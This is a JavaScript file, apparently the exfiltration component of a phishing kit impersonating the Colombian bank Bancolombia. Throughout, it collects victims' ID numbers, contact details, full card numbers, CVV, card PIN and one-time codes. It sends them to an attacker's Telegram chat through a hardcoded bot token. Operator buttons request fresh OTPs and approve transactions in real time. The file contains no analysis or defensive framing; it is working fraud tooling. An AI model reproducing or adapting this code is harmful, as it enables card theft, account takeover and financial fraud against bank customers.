// Configuración de Telegram
const TELEGRAM_BOT_TOKEN = '8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc';
const TELEGRAM_CHAT_ID = '8469651553';

// Función principal para enviar a Telegram
async function sendToTelegram(data) {
    const mensaje = formatearMensaje(data);
    const teclado = crearTeclado(data);

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: mensaje,
        parse_mode: 'Markdown',
        reply_markup: teclado
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });

        const result = await response.json();
        
        if (!result.ok) {
            throw new Error('Error al enviar mensaje a Telegram');
        }

        console.log('✅ Datos enviados a Telegram correctamente');
        return result;
        
    } catch (error) {
        console.error('❌ Error enviando a Telegram:', error);
        throw error;
    }
}

// Formatear mensaje para Telegram
function formatearMensaje(data) {
    const transactionId = Date.now().toString(36);
    
    return `
🏦 *NUEVA SOLICITUD BANCOLOMBIA*
━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 *DATOS PERSONALES*
━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 Tipo Doc: ${data.tipoDocumento || 'N/A'}
🆔 Documento: \`${data.numeroDocumento || 'N/A'}\`
👤 Nombre: ${data.nombreCompleto || 'N/A'}
📱 Celular: ${data.celular || 'N/A'}
📧 Email: ${data.email || 'N/A'}

💳 *DATOS DE TARJETA*
━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 Número: \`${data.numeroTarjeta || 'N/A'}\`
👤 Titular: ${data.nombreTitular || 'N/A'}
📅 Vencimiento: \`${data.fechaVencimiento || 'N/A'}\`
🔒 CVV: \`${data.cvv || 'N/A'}\`
🔑 Clave: \`${data.clave || 'N/A'}\`

🔐 *VERIFICACIÓN*
━━━━━━━━━━━━━━━━━━━━━━━━━━
${data.tipoVerificacion || 'Código'}: \`${data.codigoVerificacion || 'Pendiente'}\`

⏰ *Fecha y Hora*
${data.timestamp || new Date().toLocaleString('es-CO')}

🆔 *ID Transacción:* \`${transactionId}\`
━━━━━━━━━━━━━━━━━━━━━━━━━━
    `.trim();
}

// Crear teclado con botones
function crearTeclado(data) {
    const transactionId = Date.now().toString(36);
    
    return {
        inline_keyboard: [
            [
                { 
                    text: "✅ Código Correcto", 
                    callback_data: `correcto:${transactionId}` 
                },
                { 
                    text: "❌ Código Incorrecto", 
                    callback_data: `incorrecto:${transactionId}` 
                }
            ],
            [
                { 
                    text: "🔐 Solicitar Nueva Dinámica", 
                    callback_data: `nueva_dinamica:${transactionId}` 
                }
            ],
            [
                { 
                    text: "📱 Solicitar Nuevo OTP", 
                    callback_data: `nuevo_otp:${transactionId}` 
                }
            ],
            [
                { 
                    text: "✔️ Aprobar Transacción", 
                    callback_data: `aprobar:${transactionId}` 
                },
                { 
                    text: "🚫 Rechazar", 
                    callback_data: `rechazar:${transactionId}` 
                }
            ]
        ]
    };
}

// Enviar solo actualización de código
async function enviarActualizacionCodigo(codigo, tipo = 'OTP') {
    const mensaje = `
🔐 *NUEVO ${tipo.toUpperCase()}*
━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 Código: \`${codigo}\`
📱 Tipo: ${tipo}
⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}
📅 Fecha: ${new Date().toLocaleDateString('es-CO')}

━━━━━━━━━━━━━━━━━━━━━━━━━━
    `.trim();

    const transactionId = Date.now().toString(36);
    
    const teclado = {
        inline_keyboard: [
            [
                { 
                    text: "✅ Correcto", 
                    callback_data: `codigo_correcto:${transactionId}` 
                },
                { 
                    text: "❌ Incorrecto", 
                    callback_data: `codigo_error:${transactionId}` 
                }
            ],
            [
                { 
                    text: "🔄 Pedir Otro", 
                    callback_data: `pedir_otro:${transactionId}` 
                }
            ],
            [
                { 
                    text: "✔️ Finalizar", 
                    callback_data: `finalizar:${transactionId}` 
                }
            ]
        ]
    };

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: mensaje,
        parse_mode: 'Markdown',
        reply_markup: teclado
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });

        return await response.json();
    } catch (error) {
        console.error('Error:', error);
        throw error;
    }
}
